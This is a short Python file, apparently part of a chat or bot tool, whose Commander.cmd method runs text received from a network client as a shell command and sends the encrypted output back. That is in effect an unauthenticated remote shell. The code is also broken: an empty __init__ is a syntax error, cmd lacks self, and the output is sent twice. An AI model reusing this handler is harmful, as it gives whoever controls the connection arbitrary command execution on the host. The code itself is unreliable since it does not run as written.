import subprocess
import sys
from Cryptor import Cryptor

class Commander:

    def __init__(self, ):
    def cmd(commands, client, nickname, cryptor):
        del commands[0:2]
        commands_str = " ".join(commands)

        try:
            output = subprocess.getoutput(commands_str)
        except Exception as e:
            print("Subprocess failed")
            print(e)
            return
        output = f'{nickname}: {output}'
        try:
            output_encoded = cryptor.encode(output)
            client.send(output_encoded)
        except Exception as e:
            print("Failed to encode")
            print(e)
            return
        client.send(output_encoded)


def main():
 print("TBA")

if __name__ == "__main__":
    main()
